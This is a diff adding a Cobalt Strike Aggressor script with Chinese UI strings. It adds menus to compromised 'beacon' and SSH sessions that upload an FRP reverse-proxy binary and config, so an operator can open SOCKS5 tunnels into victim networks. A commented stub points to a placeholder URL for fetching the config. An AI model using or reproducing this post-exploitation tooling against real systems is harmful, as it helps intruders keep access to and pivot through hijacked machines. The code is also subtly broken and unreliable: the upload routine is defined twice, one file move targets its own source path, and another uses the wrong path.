@@ -1,0 +1,109 @@
+popup beacon_bottom {
+    menu "FrpSocks5"{
+        item "Upload" {
+            local('$bid');
+				foreach $bid ($1){
+					upload($bid);
+				}
+			}
+
+        item "Run"{
+            $bid = $1;
+            show_message("传哪里自己手动执行 :XD");
+            # $dialog = dialog("Run frpc", %(uri => "http://x.x.x.x/frpc.ini or c:\\frpc.ini", bid => $bid), &run);
+            # drow_text($dialog, "uri",  "configURI: ");
+            # dbutton_action($dialog, "ok");
+            # dialog_show($dialog);
+        }
+
+
+    }
+}
+
+sub upload{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	# $ptype = "elevatedregistrykey";
+
+	%defaults["localpath"]  = "/tmp/c";
+	%defaults["localconfigpath"] = "/tmp/c.ini";
+    %defaults["remotepath"]  = "/tmp/c";
+	%defaults["remoteconfigpath"] = "/tmp/c.ini";
+	# %defaults["droplocation"] = %persistdefaults["droplocation"];
+	# %defaults["customfile"] = %persistdefaults["customfile"];
+	# %defaults["listener"] = %persistdefaults["listener"];
+	# %defaults["template"] = %persistdefaults["template"];
+
+	$dialog = dialog("FRP Upload", %defaults, lambda({
+        # bexecute_assembly($bid,script_resource("/exe/Xshell.exe")," -Xshell ".$3["path"]." ".$3["uid"])
+		# }, \$bid, \$3)
+        bupload($bid,$3["localpath"]);
+        bupload($bid,$3["localconfigpath"]);
+        bmv($bid, $3["remotepath"], $3["remotepath"])
+        bmv($bid, $3["localconfigpath"], $3["remoteconfigpath"])
+        },\$bid, \$3)
+        );
+	dialog_description($dialog, "请输入路径");
+	drow_text($dialog, "localpath", "本地路径");
+    drow_text($dialog, "localconfigpath", "本地配置");
+    drow_text($dialog, "remotepath", "远程路径");
+    drow_text($dialog, "remoteconfigpath", "远程配置");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+popup ssh {
+    menu "Frp"{
+        item "Upload" {
+            local('$bid');
+				foreach $bid ($1){
+					upload($bid);
+				}
+			}
+
+
+        item "Run"{
+            $bid = $1;
+            show_message("传哪里自己手动执行 :XD");
+            # $dialog = dialog("Run frpc", %(uri => "http://x.x.x.x/frpc.ini or c:\\frpc.ini", bid => $bid), &run);
+            # drow_text($dialog, "uri",  "configURI: ");
+            # dbutton_action($dialog, "ok");
+            # dialog_show($dialog);
+        }
+
+
+    }
+}
+
+sub upload{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	# $ptype = "elevatedregistrykey";
+
+	%defaults["localpath"]  = "/tmp/c";
+	%defaults["localconfigpath"] = "/tmp/c.ini";
+    %defaults["remotepath"]  = "/tmp/c";
+	%defaults["remoteconfigpath"] = "/tmp/c.ini";
+	# %defaults["droplocation"] = %persistdefaults["droplocation"];
+	# %defaults["customfile"] = %persistdefaults["customfile"];
+	# %defaults["listener"] = %persistdefaults["listener"];
+	# %defaults["template"] = %persistdefaults["template"];
+	
+	$dialog = dialog("FRP Upload", %defaults, lambda({
+        # bexecute_assembly($bid,script_resource("/exe/Xshell.exe")," -Xshell ".$3["path"]." ".$3["uid"])
+		# }, \$bid, \$3)
+        bupload($bid,$3["localpath"]);
+        bupload($bid,$3["localconfigpath"]);
+        bmv($bid, $3["remotepath"], $3["remotepath"])
+        bmv($bid, $3["localconfigpath"], $3["remoteconfigpath"])
+        },\$bid, \$3)
+        );
+	dialog_description($dialog, "请输入路径");
+	dialog_description($dialog, "请输入路径");
+	drow_text($dialog, "localpath", "本地FRP路径");
+    drow_text($dialog, "localconfigpath", "本地ini路径");
+    drow_text($dialog, "remotepath", "远程FRP路径");
+    drow_text($dialog, "remoteconfigpath", "远程ini路径");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
